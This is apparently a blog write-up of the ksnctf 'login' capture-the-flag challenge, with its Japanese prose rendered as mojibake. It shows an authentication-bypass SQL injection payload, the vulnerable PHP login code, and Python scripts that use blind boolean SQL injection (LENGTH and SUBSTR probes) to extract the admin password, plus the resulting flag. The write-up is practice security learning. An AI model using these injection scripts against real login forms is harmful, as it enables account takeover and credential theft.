--- 
title: "ksnctf login write-up" 
emoji: "ð" 
type: "tech" 
topics: ["ctf", "SQL", "PHP", "python"] 
published: true
--- 

ã¿ãªãããããã«ã¡ã¯ã corkï¼ã³ã«ã¯ï¼ã§ãã 
ã»ã­ã¥ãªãã£ã®åå¼·ã¨ãã¦ctfããã£ã¦ãã¾ãããè¨é²ã®ããã«write-upãæ¸ãã¦ãããã¨æãã¾ãã 

# login (120 points) 

## æ¦è¦ 
æåãªå¸¸è¨­CTFã§ãã[ksnctf](https://ksnctf.sweetduet.info/)ã®[ç¬¬6å](https://ksnctf.sweetduet.info/problem/6)ã®è§£èª¬ã§ãã 
ãã¿ãã¬ããã¨Blind SQL Injectionã®åé¡ã§ãã

## åé¡ 
ä»¥ä¸ã®URLãä¸ãããã¾ãã
[http://ctfq.u1tramarine.blue/q6/](http://ctfq.u1tramarine.blue/q6/)
[https://ctfq.u1tramarine.blue/q6/](https://ctfq.u1tramarine.blue/q6/)

## è§£èª¬
ã¾ãããªã³ã¯ã«ã¢ã¯ã»ã¹ãã¦ã¿ãã¨ã­ã°ã¤ã³ç»é¢ãåºãã¨ã¨ãã«`First, login as "admin".`ã¨æ¸ããã¦ããã®ã§SQLã¤ã³ã¸ã§ã¯ã·ã§ã³ããªã¨æããã¨ããããã­ã°ã¤ã³ãã¦ã¿ã¾ãã

![](https://storage.googleapis.com/zenn-user-upload/b7e737addfbc-20211210.png =250x)*login page* 

**ID**ã«"admin"ã**Pass**ã«"1' or '1' = '1';--"ãå¥åãã¦ã­ã°ã¤ã³ããã¨ããä»¥ä¸ã®ãã¼ã¸ãè¡¨ç¤ºããã¾ããã

```
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

ã©ãããã­ã°ã¤ã³ããã ãã§ã¯ãã©ã°ã¯åãããadminã®ãã¹ã¯ã¼ãããã©ã°ã«ãªã£ã¦ãããããè¦ã¤ããªãã¨ãããªãããã§ãã

ã¨ããããããã¹ã¯ã¼ããç·å½ããã§æ¢ããã¨æãã¾ãã
SQLã®ç¥è­ã¯å­¦æ ¡ã§ç¿ã£ãç¨åº¦ã ã£ãã®ã§ãLIKEãç¨ãã¦1æå­ãã¤æ¢ãããããããããªã¨æã£ãã®ã§pythonã§ãã­ã°ã©ã ãçµãã§ç·å½ããã§æ¢ãã¾ããã

ä¸è¨ã®ãã¼ã¸ãè¦ã¦ããæãã¯POSTãä½¿ããã¦ãããªã®ã§ãpythonã®requestsãä½¿ã£ã¦idã¨passãéä¿¡ãã¦ã`Congratulations!`ãå«ãæå­åãè¿ãããããå¤å®ãããã¨ã§ã­ã°ã¤ã³ã«æåããããå¤å®ãã¦ãã¾ãã
ã¾ãããã¹ã¯ã¼ãã®åè£ã¨ãªãæå­ã«ã¤ãã¦ã¯ASCIIã³ã¼ããªã©ãä½¿ãã®ãé¢åã ã£ãã®ã§ã`printable characters python`ã¨Googleã§æ¤ç´¢ãã¦åºã¦ãã[ãã®ãã¼ã¸](https://stackoverflow.com/questions/5891453/how-do-i-get-a-list-of-all-the-ascii-characters-using-python)ã«æ¸ãã¦ãæå­åã«ã¡ãã£ã¨å¤æ´ãå ãããã®ãä½¿ç¨ãã¦ãã¾ããï¼åéã«æãã¦ãããã¾ãããï¼

â»SQLããã³pythonã«å¯¾ãã¦ã®ç¥è­ãã»ã¼çç¡ã«ç­ããç¶æ³ã§ã³ã¼ããæ¸ããã®ã§ãã¯ã½ã³ã¼ãã«ãªã£ã¦ãã¾ãã**åèã«ããªãã§ãã ãã**ã

```python
import requests

def is_correct_pw(pw:str):
    url = "http://ctfq.u1tramarine.blue/q6/"
    login = {
        'id': "admin",
        'pass': f"' LIKE '{pw}%'--"
    }
    r = requests.post(url, data=login)
    return ('Congratulations!' in r.text)

password = ""
for i in range(30):
    for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[\]^_`{|}~":
        if(is_correct_pw(password + c)):
            password += c
            break
print(password)
```

è¦ã¦ããã ããããã«SQLæãããªããã¡ããã¡ãã ã£ããããå¨ç¶ç¹å®ãã§ãã¾ããã§ããã

ããã§ã¨ããããSQLã«ã¤ãã¦ãã£ããã¨çè§£ããä¸ã§ãã¹ã¯ã¼ãã®é·ãã ãã§ãè§£ãããã¨ãããã¨ã§ã³ã¼ããæ¸ãã¾ããã




```python
import requests

# ãã¹ã¯ã¼ãã®é·ãã®æ¨æ¸¬
password_length  = 1
for i in range(100):
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
    login = {
        'id': sql,
        'pass': "aaa"
    }
    r = requests.post(url, data=login)
    if('Congratulations!' in r.text):
        print("length of admin's password is",i)
        password_length = i
        break
```

ãã®çµæããã¹ã¯ã¼ãã®é·ãã21ã§ãããã¨ããããã¾ããã
æ¬¡ã«ã©ãããã°ãã¹ã¯ã¼ãããããããªã¨æã£ã¦è²ãèª¿ã¹ã¦ããã¨SQLã«**SUBSTR**ã¨ãããã®ããããã¨ããããã¾ããã
ããã¯æå­åããä»»æã®é·ãã®æå­åãåãåºãããã®ã§SUBSTRãç¨ãã¦ãã¹ã¯ã¼ãã1æå­ãã¤åãåºãã¦ããããã©ã®æå­ã¨ä¸è´ããããèª¿ã¹ãã³ã¼ããæ¸ãã¾ããã

```python
import requests

# ãã¹ã¯ã¼ãã®é·ãã®æ¨æ¸¬
password_length  = 1
for i in range(100):
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
    login = {
        'id': sql,
        'pass': "aaa"
    }
    r = requests.post(url, data=login)
    if('Congratulations!' in r.text):
        print("length of admin's password is",i)
        password_length = i
        break

# passwordå¨æ¢ç´¢ã®åå¦ç
def is_correct_pw(i:int,pw:str)->bool:
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {i}, 1) = '{pw}' --"
    login = {
        'id': sql,
        'pass': ""
    }
    r = requests.post(url, data=login)
    return ('Congratulations!' in r.text)

# passwordã®å¨æ¢ç´¢
password = ""
for i in range(1,password_length + 1):
    for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[\]^_`{|}~":
        if(is_correct_pw(i,c)): 
           password += c
           print(password)
           break
print("admin's password is",password)
```

ãã®çµæãFLAGãã²ããã§ãã¾ããã
```
FLAG_KpWa4ji3uZk6TrPK
```
